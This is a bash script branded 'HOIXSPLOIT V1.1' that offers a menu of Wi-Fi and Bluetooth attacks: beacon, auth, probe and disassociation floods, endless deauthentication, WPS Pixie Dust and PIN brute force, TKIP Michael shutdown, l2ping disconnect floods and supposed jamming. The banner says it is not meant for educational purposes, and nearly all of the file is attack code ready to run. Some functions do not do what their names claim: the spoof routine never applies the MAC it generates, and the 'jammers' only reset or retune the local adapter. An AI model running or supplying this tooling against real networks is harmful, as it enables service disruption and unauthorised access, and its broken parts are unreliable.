#!/bin/bash

CYAN='\033[0;36m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m'

trap "echo -e '\n${RED}[*] Cleaning up and exiting...${NC}'; killall mdk4 aireplay-ng reaver bully hciconfig hcitool l2ping rfcomm >/dev/null 2>&1; exit" INT

clear
read -p "Enter your monitor mode interface (e.g., wlan0mon): " iface

echo -e "${YELLOW}[*] Scanning required packages...${NC}"

tools=(reaver bully aircrack-ng airmon-ng airodump-ng mdk4 iwconfig hciconfig hcitool l2ping rfcomm)
missing=0

for tool in "${tools[@]}"; do
    if command -v "$tool" &>/dev/null; then
        echo -e "${GREEN}$tool: Found.${NC}"
    else
        echo -e "${RED}$tool: MISSING!${NC}"
        missing=1
    fi
done

if [[ $missing -eq 1 ]]; then
    echo -e "${RED}[-] One or more required tools are missing. Install them and try again.${NC}"
    exit 1
fi

sleep 2

banner() {
echo -e "${MAGENTA}
⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀
⢻⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡇
⢸⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⢤⣶⠶⠶⢶⣶⡤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠋⢀⠇
⠈⣇⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⢉⡴⠞⠋⣿⠀⠀⠀⡯⠙⠳⣦⡉⠙⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⣼⠀
⠀⠹⣆⠀⠀⠈⠛⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⢀⣰⠏⠀⠀⠀⢻⡄⠀⢰⠇⠀⠀⠈⢻⣄⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠁⠀⠀⣰⠃⠀
⠀⠀⠹⣇⠀⠀⠀⠀⠉⠳⢦⣄⡀⠀⠀⠀⢀⡾⠃⠀⣠⠞⠋⠁⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠉⠙⢷⣄⠀⠙⢧⡀⠀⠀⠀⢀⣠⡶⠛⠁⠀⠀⠀⠀⣴⠃⠀⠀
⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠈⠙⠳⠶⢤⣿⣄⣀⣸⠋⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢹⣆⣀⣨⣷⡤⠶⠚⠋⠁⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠈⡇⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣧⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⡟⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠛⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⣀⠀⠀⠀⠀⠀⠀⢀⡟⠀⡏⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⣿⠀⢿⡀⠀⠀⠀⠀⠀⠀⣠⡴⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡆⠉⢻⡶⢤⣀⡀⢀⡾⠁⣼⠃⠀⠀⠀⠀⠀⠀⣸⠹⣆⠀⠀⠀⠀⠀⠀⠹⣆⠘⢧⡀⢀⣠⡤⢶⡟⠉⢰⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⣧⠀⢸⠃⠀⣨⠿⠋⣠⠞⠁⠀⠀⠀⠀⠀⠀⢸⡏⠀⣹⡆⠀⠀⠀⠀⠀⠀⠘⢦⣈⠛⢿⡅⠀⢸⡇⠀⡿⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡕⣿⣧⣸⡀⠀⠛⡶⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⣾⠃⠀⢸⣇⡼⡿⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠘⢯⡙⠷⣄⣸⠇⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⠹⣄⠀⠀⠀⠀⠀⠀⢀⣼⠃⠀⢹⣆⣠⠞⣫⡿⠁⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣄⢀⠙⢷⡘⣿⣷⡶⣄⠙⠷⣄⡀⠀⠀⠀⠘⠁⠀⠀⠀⠈⠃⠀⠀⠀⢀⣴⠞⢁⣤⢶⣾⡿⢡⡾⠋⡀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠸⣇⠈⣻⣷⣿⠳⣤⡈⠙⠓⠄⠀⠈⠳⡄⠀⣰⠛⠁⠀⠠⠞⠋⢀⣴⠟⣇⣿⡟⠀⣾⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠻⣾⠏⠸⣿⣦⡈⠛⠶⢤⣤⣤⣤⠴⡷⠶⣿⠦⣤⣤⣤⡤⠾⠋⢁⣼⣿⠁⠹⣶⠏⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣄⠀⣿⠀⠀⠘⠿⣿⣦⣤⢴⣿⡿⠃⠀⡷⠛⣦⠀⠘⢿⣷⠦⣤⣶⣿⠟⠁⠀⢀⡿⢀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⠘⣷⣄⠀⠀⠀⠉⠉⠉⠁⠀⠀⠀⡇⠀⡟⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⣠⣾⠁⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣴⡏⢹⢷⣦⣄⡀⠀⣀⣤⡤⢤⡀⡧⠀⠇⢀⡤⢤⣤⡀⠀⣀⣠⣴⣿⡏⢻⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠈⣧⢸⡾⠁⣨⣿⡟⠙⢯⣀⠀⠀⠀⠀⠀⠀⢀⣀⡿⠉⢻⢿⡁⠘⣿⠃⡿⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡓⠶⠶⠿⡛⠥⠞⠉⢠⣿⣄⡀⠉⠉⠻⣦⣀⡴⠛⠉⠉⢀⣴⣿⡀⠙⠲⠬⣻⠷⠶⠶⢚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣀⣀⣀⣠⣴⡋⢻⣿⡛⢳⠒⣤⠼⣿⠧⣤⢲⡞⢻⣿⠋⢹⡦⣄⣀⣀⣀⣤⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠹⣆⠈⠛⣾⣿⣧⣿⠙⠛⠓⠛⠚⠛⢋⣇⡾⣿⣷⠋⠀⣼⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡀⣿⣿⣆⠙⠃⠀⠀⠀⠀⠀⠘⠋⣼⡿⣿⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡿⣮⡙⠛⣟⣻⣯⣯⣽⣟⣿⠛⢋⣴⣷⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣼⣏⠛⣋⣤⠶⠒⠶⣤⣙⠛⣹⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡉⠉⠉⠀⣠⣤⡄⠀⠉⠉⢁⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠲⠤⠞⠋⠀⠙⠶⠤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		 ----~  HOIXSPLOIT V1.1 ~----
                IMPORTANT REMINDER: This tool is NOT meant for educational purposes
${NC}"
}

beacon_flood() {
    echo -e "${CYAN}Launching infinite beacon hell. Rotating SSID every 10s...${NC}"
    while true; do
        temp_file=$(mktemp /tmp/ssidlist.XXXXXX)
        for ((i = 1; i <= 150; i++)); do
            rand_ssid=$(LC_ALL=C head -c 100 /dev/urandom | tr -dc 'A-Za-z0-9!@#$%^&*()_+=<>,.:;' | head -c $((8 + RANDOM % 8)))
            echo "$rand_ssid" >> "$temp_file"
        done
        mdk4 "$iface" b -f "$temp_file" -s 500 &
        pid=$!
        sleep 10
        kill "$pid"
        rm -f "$temp_file"
    done
}

deauth_attack() {
    read -p "Enter target BSSID (router MAC): " bssid
    read -p "Enter client MAC (or leave blank for broadcast): " client
    read -p "Enter target channel: " channel

    echo -e "${YELLOW}Setting interface $iface to channel $channel...${NC}"
    iwconfig "$iface" channel "$channel"

    if [[ -z "$client" ]]; then
        aireplay-ng --deauth 0 -a "$bssid" "$iface"
    else
        aireplay-ng --deauth 0 -a "$bssid" -c "$client" "$iface"
    fi
}

wps_pixie() {
    read -p "Enter target BSSID: " bssid
    read -p "Enter channel: " channel
    reaver -i "$iface" -b "$bssid" -c "$channel" -K 1 -vv
}

wps_push_button() {
    echo -e "${YELLOW}[*] Scanning with bully...${NC}"
    read -p "Enter target BSSID: " bssid
    bully "$iface" -b "$bssid"
}

michael_shutdown() {
    echo -e "${CYAN}Triggering TKIP Michael shutdown...${NC}"
    mdk4 "$iface" m
}

probe_flood() {
    echo -e "${CYAN}Launching probe request flood...${NC}"
    mdk4 "$iface" p
}

auth_flood() {
    echo -e "${CYAN}Launching auth flood...${NC}"
    mdk4 "$iface" a
}

disassoc_flood() {
    echo -e "${CYAN}Launching disassociation flood...${NC}"
    mdk4 "$iface" d
}

channel_jammer() {
    echo -e "${YELLOW}[*] Channel jammer active...${NC}"
    while true; do
        channel=$(( ( RANDOM % 13 )  + 1 ))
        iwconfig "$iface" channel "$channel"
        echo -ne "${GREEN}Jamming Channel $channel...\r${NC}"
        sleep 0.4
    done
}

# ========== BLUETOOTH ATTACKS ==========

bt_scan() {
    echo -e "${CYAN}Scanning for Bluetooth devices (10 seconds)...${NC}"
    timeout 10 hcitool scan
}

bt_disconnect() {
    read -p "Enter Bluetooth MAC to disconnect: " mac
    echo -e "${YELLOW}Sending disconnect signal...${NC}"
    l2ping -i hci0 -s 1 -f "$mac"
}

bt_jamming() {
    echo -e "${CYAN}Starting continuous Bluetooth jamming on hci0... Press Ctrl+C to stop.${NC}"
    while true; do
        hciconfig hci0 reset
        sleep 0.5
    done
}

bt_rfcomm_bind() {
    read -p "Enter Bluetooth MAC to bind RFCOMM: " mac
    read -p "Enter RFCOMM channel (1-30): " ch
    echo -e "${YELLOW}Binding RFCOMM channel $ch to $mac ...${NC}"
    rfcomm bind rfcomm0 "$mac" "$ch"
}

bt_spoof() {
    echo -e "${CYAN}Spoofing Bluetooth MAC address on hci0...${NC}"
    new_mac=$(printf '02:%02X:%02X:%02X:%02X:%02X\n' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    hciconfig hci0 down
    hciconfig hci0 leadv 0
    hciconfig hci0 up
    hciconfig hci0 reset
    hciconfig hci0 down
    hciconfig hci0 up
    hciconfig hci0 name "SpoofedDevice"
    echo "Spoofed MAC: $new_mac"
}

bt_attack_menu() {
    while true; do
        clear
        echo -e "${MAGENTA}=== Bluetooth Attacks ===${NC}"
        echo -e "${CYAN}1) Scan for devices
2) Disconnect device (l2ping flood)
3) Continuous Bluetooth jamming (hciconfig reset)
4) Bind RFCOMM channel
5) Spoof Bluetooth MAC
0) Back to main menu${NC}"
        read -p "Choose Bluetooth attack: " bopt
        case $bopt in
            1) bt_scan ;;
            2) bt_disconnect ;;
            3) bt_jamming ;;
            4) bt_rfcomm_bind ;;
            5) bt_spoof ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
        echo -e "${YELLOW}Press enter to continue...${NC}"
        read
    done
}

# ========== MAIN MENU ==========

while true; do
    clear
    banner
    echo -e "${CYAN}
1. Beacon Flood
2. Deauth (Aireplay-ng)
3. WPS Pixie Dust Attack
4. WPS Push Button Attack
5. Michael Shutdown
6. Probe Request Flood
7. Auth Flood
8. Disassoc Flood
9. Channel Hopper Jammer
10. Bluetooth Attacks
0. Exit
${NC}"
    read -p "> " opt
    case $opt in
        1) beacon_flood ;;
        2) deauth_attack ;;
        3) wps_pixie ;;
        4) wps_push_button ;;
        5) michael_shutdown ;;
        6) probe_flood ;;
        7) auth_flood ;;
        8) disassoc_flood ;;
        9) channel_jammer ;;
        10) bt_attack_menu ;;
        0) echo -e "${RED}Exiting...${NC}"; exit ;;
        *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
    esac
done
